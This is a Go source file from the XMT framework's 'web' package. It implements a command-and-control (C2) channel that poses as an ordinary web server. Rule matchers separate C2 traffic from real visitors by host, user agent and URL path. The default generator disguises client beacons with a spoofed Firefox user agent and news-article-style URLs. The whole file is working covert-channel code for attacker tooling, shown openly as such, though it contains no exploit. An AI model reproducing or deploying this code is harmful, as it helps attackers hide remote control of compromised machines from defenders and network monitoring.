package web

import (
	"context"
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"sync"
	"time"

	"github.com/iDigitalFlame/xmt/xmt/com/limits"
	"github.com/iDigitalFlame/xmt/xmt/com/tcp"
	"github.com/iDigitalFlame/xmt/xmt/util"
)

var (
	// DefaultClient is the HTTP CLient struct that is used when
	// the provided client is nil. This is a standard struct that uses
	// the RawDefaultTimeout as the timeout value and incorporates any proxy
	// settings from the environment.
	DefaultClient = &http.Client{
		Timeout: tcp.RawDefaultTimeout,
		Transport: &http.Transport{
			Proxy: http.ProxyFromEnvironment,
			DialContext: (&net.Dialer{
				Timeout:   tcp.RawDefaultTimeout,
				KeepAlive: tcp.RawDefaultTimeout,
				DualStack: true,
			}).DialContext,
			MaxIdleConns:          limits.SmallLimit(),
			IdleConnTimeout:       tcp.RawDefaultTimeout,
			TLSHandshakeTimeout:   tcp.RawDefaultTimeout,
			ExpectContinueTimeout: tcp.RawDefaultTimeout,
			ResponseHeaderTimeout: tcp.RawDefaultTimeout,
		},
	}

	// DefaultGenerator is the generator used if no generator is provided when
	// a client attempts a connection. The default values are a URL for an API
	// and Firefox version 64 user agent.
	DefaultGenerator = &Generator{
		URL:   util.Matcher("/news/post/%d/"),
		Agent: util.Matcher("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:64.0) Gecko/20101%100d Firefox/64.0"),
	}
)

// Rule is a struct that represents a rule set
// used by the Web server to determine the difference between
// normal and C2 traffic.
type Rule struct {
	URL, Host, Agent matcher
}

// Server is a C2 profile that mimics a standard web server and
// client setup. This struct inherits the http.Server struct and can
// be used to serve real files and pages. Use the Mapper struct to
// provide a URL mapping that can be used by clients to access the C2
// functions.
type Server struct {
	Client    *http.Client
	Generator *Generator

	ctx     context.Context
	tls     *tls.Config
	dial    *net.Dialer
	lock    sync.RWMutex
	rules   []*Rule
	cancel  context.CancelFunc
	handler *http.ServeMux
}

// Client is a simple struct that supports the
// C2 client connector interface. This can be used by
// clients to connect to a Web instance. By default, this
// struct will use the DefaultClient instance.
type Client struct {
	Generator *Generator
	*http.Client
}

// Generator is a struct that is composed of three separate
// fmt.Stringer interfaces. These are called via their 'String'
// function to specify the User-Agent, URL and Host string values.
// They can be set to static strings using the 'util.String' wrapper.
// This struct can be used as a C2 client connector. If the Client
// property is not set, the DefaultClient value will be used.
type Generator struct {
	URL, Host, Agent fmt.Stringer
}
type matcher interface {
	MatchString(string) bool
}

// Close terminates this Web instance and signals
// all current listeners and clients to disconnect.
// This will close all connections related to this struct.
func (s *Server) Close() error {
	s.cancel()
	return nil
}

// New creates a new Web C2 server instance. This can be passed
// to the Listen function of a controller to serve a Web Server that
// also acts as a C2 instance. This struct supports all the default
// Golang http.Server functions and can be used to serve real web pages.
// Rules must be defined using the 'Rule' function to allow the server to
// differentiate between C2 and real traffic.
func New(t time.Duration) *Server {
	return NewTLS(t, nil)
}

// Rule adds the specified rules to the Web instance to
// assist in determing real and C2 traffic.
func (s *Server) Rule(r ...*Rule) {
	if r == nil || len(r) == 0 {
		return
	}
	s.lock.Lock()
	defer s.lock.Unlock()
	if s.rules == nil {
		s.rules = make([]*Rule, 0, len(r))
	}
	s.rules = append(s.rules, r...)
}
func (r Rule) checkMatch(c *http.Request) bool {
	if r.Host != nil && !r.Host.MatchString(c.Host) {
		return false
	}
	if r.Agent != nil && !r.Agent.MatchString(c.UserAgent()) {
		return false
	}
	if r.URL != nil && !r.URL.MatchString(c.URL.EscapedPath()) {
		return false
	}
	return true
}

// Handle registers the handler for the given pattern.
// If a handler already exists for pattern, Handle panics.
func (s *Server) Handle(p string, h http.Handler) {
	s.handler.Handle(p, h)
}
func (s *Server) checkMatch(r *http.Request) bool {
	if len(s.rules) == 0 {
		return false
	}
	s.lock.RLock()
	defer s.lock.RUnlock()
	for i := range s.rules {
		if s.rules[i].checkMatch(r) {
			return true
		}
	}
	return false
}

// NewTLS creates a new TLS wrapped Web C2 server instance. This can be passed
// to the Listen function of a controller to serve a Web Server that
// also acts as a C2 instance. This struct supports all the default
// Golang http.Server functions and can be used to serve real web pages.
// Rules must be defined using the 'Rule' function to allow the server to
// differentiate between C2 and real traffic.
func NewTLS(t time.Duration, c *tls.Config) *Server {
	w := &Server{
		tls: c,
		dial: &net.Dialer{
			Timeout:   t,
			KeepAlive: t,
			DualStack: true,
		},
		lock:    sync.RWMutex{},
		rules:   make([]*Rule, 0),
		handler: &http.ServeMux{},
	}
	w.ctx, w.cancel = context.WithCancel(context.Background())
	w.Client = &http.Client{
		Timeout: t,
		Transport: &http.Transport{
			Dial:                  w.dial.Dial,
			Proxy:                 http.ProxyFromEnvironment,
			DialContext:           w.dial.DialContext,
			MaxIdleConns:          limits.SmallLimit(),
			IdleConnTimeout:       w.dial.Timeout,
			TLSHandshakeTimeout:   w.dial.Timeout,
			ExpectContinueTimeout: w.dial.Timeout,
			ResponseHeaderTimeout: w.dial.Timeout,
		},
	}
	return w
}

// Connect creates a C2 client connector that uses the same properties of
// the WebClient and Generator instances that creates this.
func (c *Client) Connect(u string) (net.Conn, error) {
	s := &client{
		gen:    c.Generator,
		host:   u,
		client: c.Client,
	}
	if s.gen == nil {
		s.gen = DefaultGenerator
	}
	return s, nil
}

// Connect creates a C2 client connector that uses the same properties of
// the Web struct that creates this.
func (s *Server) Connect(u string) (net.Conn, error) {
	c := &client{
		gen:    s.Generator,
		host:   u,
		parent: s,
	}
	if c.gen == nil {
		c.gen = DefaultGenerator
	}
	return c, nil
}

// Listen returns a new C2 listener for this Web instance. This
// function creates a separate server, but still shares the handler for the
// base Web instance that it's created from.
func (s *Server) Listen(u string) (net.Listener, error) {
	var err error
	var c net.Listener
	if s.tls != nil {
		if (s.tls.Certificates == nil || len(s.tls.Certificates) == 0) || s.tls.GetCertificate == nil {
			return nil, tcp.ErrInvalidTLSConfig
		}
		c, err = tls.Listen(network, u, s.tls)
	} else {
		c, err = net.Listen(network, u)
	}
	if err != nil {
		return nil, err
	}
	l := &listener{
		new:    make(chan *conn, limits.SmallLimit()),
		parent: s,
		Server: &http.Server{
			TLSConfig:         s.tls,
			Handler:           &http.ServeMux{},
			ReadTimeout:       s.dial.Timeout,
			IdleTimeout:       s.dial.Timeout,
			WriteTimeout:      s.dial.Timeout,
			ReadHeaderTimeout: s.dial.Timeout,
		},
		listener: c,
	}
	l.ctx, l.cancel = context.WithCancel(s.ctx)
	l.Server.Handler.(*http.ServeMux).Handle("/", l)
	l.Server.BaseContext = l.context
	go l.listen()
	return l, nil
}

// HandleFunc registers the handler function for the given pattern.
func (s *Server) HandleFunc(p string, h func(http.ResponseWriter, *http.Request)) {
	s.handler.HandleFunc(p, h)
}
